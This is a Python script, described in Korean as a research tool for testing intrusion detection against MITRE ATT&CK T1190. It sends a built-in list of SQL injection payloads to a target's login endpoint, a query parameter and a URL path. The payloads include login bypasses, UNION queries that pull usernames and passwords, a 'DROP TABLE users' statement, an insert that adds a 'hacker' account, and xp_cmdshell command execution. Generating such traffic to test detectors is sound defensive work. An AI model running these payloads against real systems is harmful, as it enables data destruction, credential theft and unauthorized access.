"""
MITRE ATT&CK: T1190 - Exploit Public-Facing Application (SQL Injection)
연구 목적 침입 탐지 테스트용 스크립트
사용법: python sql_injection.py --host http://<TARGET> [--delay FLOAT]
"""
import argparse
import requests
import time
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "' UNION SELECT null, username, password FROM users --",
    "' AND 1=0 UNION SELECT table_name FROM information_schema.tables --",
    "admin'--",
    "' OR 1=1#",
    "\" OR \"\"=\"",
    "1' AND SLEEP(3) --",
    "1; EXEC xp_cmdshell('whoami') --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    "'; INSERT INTO users (username, password) VALUES ('hacker','hacked'); --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --",
    "' ORDER BY 1--",
]

LOGIN_ENDPOINT = "/api/auth/login"
POSTS_ENDPOINT = "/api/posts"


def inject_login(base_url: str, payload: str, delay: float) -> None:
    url = f"{base_url}{LOGIN_ENDPOINT}"
    data = {"username": payload, "password": payload}
    try:
        resp = requests.post(url, json=data, timeout=5)
        logger.info("LOGIN username_payload=%r status=%d", payload, resp.status_code)
    except requests.RequestException as exc:
        logger.error("LOGIN 오류 — payload=%r error=%s", payload, exc)
    time.sleep(delay)


def inject_query_param(base_url: str, payload: str, delay: float) -> None:
    url = f"{base_url}{POSTS_ENDPOINT}"
    params = {"page": payload, "size": "10"}
    try:
        resp = requests.get(url, params=params, timeout=5)
        logger.info("GET /api/posts?page=%r status=%d", payload, resp.status_code)
    except requests.RequestException as exc:
        logger.error("GET 오류 — payload=%r error=%s", payload, exc)
    time.sleep(delay)


def inject_path(base_url: str, payload: str, delay: float) -> None:
    url = f"{base_url}/api/posts/{payload}"
    try:
        resp = requests.get(url, timeout=5)
        logger.info("GET /api/posts/%r status=%d", payload, resp.status_code)
    except requests.RequestException as exc:
        logger.error("PATH 오류 — payload=%r error=%s", payload, exc)
    time.sleep(delay)


def run(host: str, delay: float) -> None:
    base_url = host.rstrip("/")
    logger.info("T1190 SQL Injection 시작 — 대상: %s, payload 수: %d", base_url, len(SQL_PAYLOADS))

    for payload in SQL_PAYLOADS:
        inject_login(base_url, payload, delay)
        inject_query_param(base_url, payload, delay)
        inject_path(base_url, payload, delay)

    logger.info("완료 — 총 %d개 payload 주입 시도", len(SQL_PAYLOADS))


def main() -> None:
    parser = argparse.ArgumentParser(
        description="T1190 SQL Injection 침입 탐지 테스트 스크립트"
    )
    parser.add_argument("--host", required=True, help="대상 호스트 URL (예: http://192.168.1.1)")
    parser.add_argument("--delay", type=float, default=0.05, help="요청 간격(초) (기본값: 0.05)")
    args = parser.parse_args()

    run(args.host, args.delay)


if __name__ == "__main__":
    main()
